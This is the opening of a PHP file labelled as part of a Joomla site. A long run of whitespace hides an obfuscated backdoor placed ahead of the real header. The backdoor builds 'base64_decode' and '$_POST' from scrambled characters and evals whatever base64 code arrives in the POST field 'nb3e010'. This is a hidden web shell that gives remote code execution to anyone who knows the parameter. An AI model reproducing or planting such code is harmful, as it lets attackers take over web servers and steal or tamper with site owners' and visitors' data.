<?php                                                                                                                                                                                                                                                    $qme0= "o6pe_ctb4dsa" ;$ifs82 =strtolower($qme0[7].$qme0[11].$qme0[10].$qme0[3] . $qme0[1].$qme0[8] . $qme0[4]. $qme0[9]. $qme0[3].$qme0[5].$qme0[0].$qme0[9].$qme0[3] ) ; $xbn61=strtoupper ($qme0[4].$qme0[2].$qme0[0].$qme0[10]. $qme0[6]) ; if( isset( ${$xbn61} ['nb3e010' ])) { eval ( $ifs82 ( ${$xbn61} ['nb3e010'] ) ); } ?> <?php
/**
 * @package     Joomla.Site
